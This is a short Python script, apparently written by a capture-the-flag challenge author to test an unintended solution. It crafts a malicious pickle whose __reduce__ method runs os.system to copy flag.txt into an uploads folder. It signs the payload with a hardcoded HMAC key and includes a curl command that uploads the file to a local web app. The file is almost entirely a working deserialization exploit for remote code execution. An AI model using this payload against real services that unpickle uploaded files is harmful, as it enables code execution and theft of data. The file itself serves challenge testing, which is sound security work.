# attack test code (for checking the unintended attack)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

class RCE:
    def __reduce__(self):
        return (os.system, ("cat flag.txt > uploads/hacked.txt",)) # it's blocked if the path is not under app/uploads/

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious2.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious2.pkl" \
  -F "sig=ad75e73db80ab3bebdc89bee4e00fa6d66ef4e72abba4316945da5705a60335e"
'''
